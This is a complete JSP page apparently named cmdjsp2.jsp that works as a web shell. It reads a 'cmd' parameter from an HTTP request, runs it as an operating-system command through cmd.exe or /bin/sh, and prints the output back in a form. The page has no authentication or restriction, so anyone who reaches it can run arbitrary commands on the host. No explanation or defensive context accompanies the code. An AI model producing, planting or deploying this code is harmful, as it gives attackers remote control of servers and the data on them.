<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    StringBuilder output = new StringBuilder();

    if (cmd != null) {
        BufferedReader sI = null;
        BufferedReader sE = null;
        Process p = null;

        try {
            String os = System.getProperty("os.name").toLowerCase();
            String[] fullCmd;
            if (os.contains("win")) {
                fullCmd = new String[] { "cmd.exe", "/C", cmd };
            } else {
                fullCmd = new String[] { "/bin/sh", "-c", cmd };
            }

            ProcessBuilder pb = new ProcessBuilder(fullCmd);
            p = pb.start();

            sI = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
            sE = new BufferedReader(new InputStreamReader(p.getErrorStream(), "UTF-8"));

            String line;
            while ((line = sI.readLine()) != null) {
                output.append(line).append("\n");
            }
            while ((line = sE.readLine()) != null) {
                output.append(line).append("\n");
            }

            int exitCode = p.waitFor();
            output.append("Exit code: ").append(exitCode).append("\n");
        } 
        catch (IOException ioe) {
            output.append("IOException: ").append(ioe.getMessage()).append("\n");
        } 
        catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
            output.append("InterruptedException: ").append(ie.getMessage()).append("\n");
        } 
        catch (Exception e) {
            output.append("Unexpected error: ").append(e.getMessage()).append("\n");
        } 
        finally {
            try { if (sI != null) sI.close(); } catch (IOException ignore) {}
            try { if (sE != null) sE.close(); } catch (IOException ignore) {}
            if (p != null) {
                try { p.getInputStream().close(); } catch (IOException ignore) {}
                try { p.getErrorStream().close(); } catch (IOException ignore) {}
                p.destroy();
            }
        }
    }
%>

<form method="get" action="cmdjsp2.jsp">
    <input name="cmd" type="text" size="60">
    <input type="submit" value="Run">
</form>

<hr>

<pre><%= output.toString().replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") %></pre>
